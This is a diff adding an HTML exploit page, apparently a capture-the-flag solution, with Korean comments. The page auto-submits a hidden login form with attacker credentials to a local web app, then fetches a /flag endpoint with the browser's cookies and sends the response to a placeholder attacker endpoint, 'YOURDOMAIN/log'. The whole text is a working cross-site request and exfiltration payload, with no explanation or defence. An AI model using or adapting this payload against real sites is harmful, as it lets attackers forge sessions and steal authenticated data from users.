@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+<body>
+<form id="f" action="http://127.0.0.1:3000/login" method="POST" target="win">
+  <input name="username" value="attacker">
+  <input name="password" value="pw123">
+</form>
+<script>
+const exfil = "https://YOURDOMAIN/log"; // 공격자 수집 엔드포인트
+const win = window.open("about:blank", "win"); // 1st-party 컨텍스트
+const form = document.getElementById("f");
+form.submit();
+
+// 세션 생성 시간 약간 기다렸다가 flag 요청
+setTimeout(async () => {
+  try {
+    const flag = await fetch("http://127.0.0.1:3000/flag", { credentials: "include" }).then(r => r.text());
+    await fetch(`${exfil}?f=${encodeURIComponent(flag)}`);
+  } catch(e) {}
+}, 400);
+</script>
+</body>
+</html>
